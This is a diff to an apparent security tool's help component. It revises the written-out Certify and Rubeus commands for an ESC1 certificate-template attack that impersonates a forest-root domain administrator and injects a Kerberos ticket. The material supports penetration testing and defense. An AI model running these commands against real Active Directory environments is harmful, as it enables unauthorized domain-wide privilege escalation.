@@ -27,7 +27,7 @@ const WindowsAbuse: FC = () => {
             </Typography>
             <Typography component={'pre'}>
                 {
-                    'Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:"ESC1" /altname:forestroot\\ForestRootDA'
+                    'Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:"ESC1" /altname:forestrootda /sidextension:S-1-5-21-2697957641-2271029196-387917394-500'
                 }
             </Typography>
             <Typography variant='body2'>Save the certificate as cert.pem and the private key as cert.key.</Typography>
@@ -44,7 +44,7 @@ const WindowsAbuse: FC = () => {
                 target identity to impersonate and the PFX-formatted certificate created in Step 2:
             </Typography>
             <Typography component={'pre'}>
-                {'Rubeus asktgt /user:"forestroot\\forestrootda" /certificate:cert.pfx /password:asdf /ptt'}
+                {'Rubeus asktgt /user:forestrootda /domain:forestroot.com /certificate:cert.pfx /password:asdf /ptt'}
             </Typography>
             <Typography variant='body2'>
                 <b>Step 5</b>: Optionally verify the TGT by listing it with the klist command:
